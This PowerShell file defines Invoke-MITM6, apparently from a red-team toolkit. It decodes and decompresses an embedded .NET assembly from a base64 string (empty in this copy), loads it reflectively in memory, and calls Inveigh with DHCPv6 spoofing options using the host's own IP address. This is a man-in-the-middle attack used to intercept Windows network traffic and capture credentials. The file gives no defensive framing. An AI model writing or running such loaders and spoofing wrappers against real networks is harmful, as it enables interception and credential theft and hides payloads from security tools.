function Invoke-MITM6
{

    [CmdletBinding()]
    Param (
        [String]
        $Command = " "

    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String(""))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    if (!(isadmin))
    {
      $command = "-Elevated N " + $command
    }
    else
    {
        $command = "-Elevated Y " + $command
    }
    $ip = Get-currentIP
    $ip = $ip.IPv4Address.IPAddress
    Write-Host $ip
    $command = "-SpooferIP $ip " + $command
    $command = "-DHCPV6 Y " + $command
    [Inveigh.Program]::Main($Command.Split(" "))
}

function isadmin
{
    # Check if Elevated
    $isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    return $isAdmin
}

function Get-currentIP
{

    $IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}
    return $IPaddress
}
